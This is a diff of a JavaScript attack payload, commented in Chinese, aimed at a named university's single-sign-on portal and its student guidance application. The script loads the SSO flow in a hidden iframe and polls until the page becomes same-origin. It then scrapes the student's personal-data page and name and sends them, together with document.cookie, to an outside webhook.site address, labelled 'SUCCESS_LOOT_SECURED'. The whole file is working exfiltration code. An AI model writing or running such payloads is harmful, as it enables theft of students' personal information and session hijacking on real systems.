@@ -1,63 +1,73 @@
 (async () => {
-    // === 設定區域 ===
-    // 你的 Webhook 接收地址
     const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
     
-    // SSO 入口 (位於 iportal2，用於觸發登入)
+    // 1. 觸發點：這是 iportal 的 SSO 入口
+    // 瀏覽器會自動帶上 iportal 的 cookie，並滿足 Referer 要求
     const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
-    
-    // 攻擊目標 (位於 ap.itc，登入後才有權限訪問)
-    // 建議先試試看這個登入檢查點，或者你可以換成首頁 "/GuidanceApp/index.do"
-    const targetUrl = "/GuidanceApp/StdtLoginCtrl?PageType=1B"; 
-    // const targetUrl = "/GuidanceApp/student/studentInfo.do"; // 備用目標
 
-    // === 攻擊邏輯 ===
     try {
-        // 1. 創建隱藏的子 Iframe (Level 3)
-        // 這會利用瀏覽器自動攜帶 iportal2 Cookie 的特性，完成 SSO 流程
-        // 並將新的 ap.itc Session Cookie 寫入瀏覽器
+        // 創建隱藏 Iframe
         const ifr = document.createElement('iframe');
         ifr.style.display = 'none';
         ifr.src = ssoUrl;
         document.body.appendChild(ifr);
 
-        // 回報狀態：開始攻擊
-        fetch(webhook + "?step=1_triggering_sso");
+        fetch(webhook + "?msg=Step1_Iframe_Created");
 
-        // 2. 等待 SSO 流程完成
-        // 這需要一點時間讓子 iframe 載入、執行 JS、POST、重導向
-        // 設定 5 秒應該足夠，如果網路慢可以設久一點
-        await new Promise(resolve => setTimeout(resolve, 10000));
+        // 2. 輪詢監控 (Polling)
+        // 我們每隔 1 秒檢查一次 iframe 的狀態
+        let checkCount = 0;
+        const maxChecks = 20; // 最多等 20 秒
 
-        // 3. 嘗試讀取目標資料 (Level 2 - 自身環境)
-        // 此時 Session 應該已經建立，且因為我們在 ap.itc 同源環境，可以直接 fetch
-        const response = await fetch(targetUrl);
-        const content = await response.text();
+        const timer = setInterval(() => {
+            checkCount++;
+            try {
+                // 嘗試讀取 iframe 網址
+                // 如果還在 iportal2 (跨域)，這裡會報錯 (SecurityError)
+                // 如果跳轉回 ap.itc (同源)，這裡會成功！
+                const currentUrl = ifr.contentWindow.location.href;
+                
+                // 如果能讀到 URL，說明已經回到同源了！
+                fetch(webhook + "?msg=Step2_SameOrigin_Detected&url=" + encodeURIComponent(currentUrl));
 
-        // 4. 回傳戰果
-        const loot = {
-            msg: "Attack Completed",
-            current_origin: window.location.origin,
-            target_url: targetUrl,
-            status_code: response.status,
-            // 抓取部分內容預覽 (避免過長)
-            html_preview: content.substring(0, 12000),
-            // 所有的 Cookie (包含剛剛 SSO 拿到的新 Session)
-            cookies: document.cookie
-        };
+                // 檢查是否已經是登入後的頁面 (StdtLoginCtrl)
+                if (currentUrl.includes("StdtLoginCtrl") || currentUrl.includes("GuidanceApp")) {
+                    // 3. 收割數據
+                    // 直接讀取 iframe 內部的 HTML，這就是那張包含個資的頁面
+                    const pageHtml = ifr.contentWindow.document.body.innerHTML;
+                    const cookies = document.cookie; // 順便拿新的 Session ID
 
-        await fetch(webhook, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(loot)
-        });
+                    // 簡單提取姓名做驗證
+                    let name = pageHtml.match(/學生姓名:.*?form-control-static">([^<&]+)/)?.[1]?.trim() || "Unknown";
 
-        // 5. (可選) 清理現場
-        // document.body.removeChild(ifr); 
-        // 建議不要太快移除，以免流程還沒跑完，或者為了保持 Session 活躍
+                    fetch(webhook, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({
+                            msg: "SUCCESS_LOOT_SECURED",
+                            victim_name: name,
+                            final_url: currentUrl,
+                            html_content: pageHtml.substring(0, 5000), // 截取前 5000 字
+                            cookies: cookies
+                        })
+                    });
+
+                    // 任務完成，清除定時器
+                    clearInterval(timer);
+                    // document.body.removeChild(ifr); // 可選：清理 iframe
+                }
+
+            } catch (e) {
+                // 如果報錯，說明還在 iportal2 (跨域中)，繼續等待...
+                // console.log("Waiting for redirect...", e.message);
+                if (checkCount >= maxChecks) {
+                    clearInterval(timer);
+                    fetch(webhook + "?error=Timeout_Waiting_For_Redirect");
+                }
+            }
+        }, 1000); // 每秒檢查一次
 
     } catch (e) {
-        // 錯誤處理
         fetch(webhook + "?error=" + encodeURIComponent(e.message));
     }
 })();
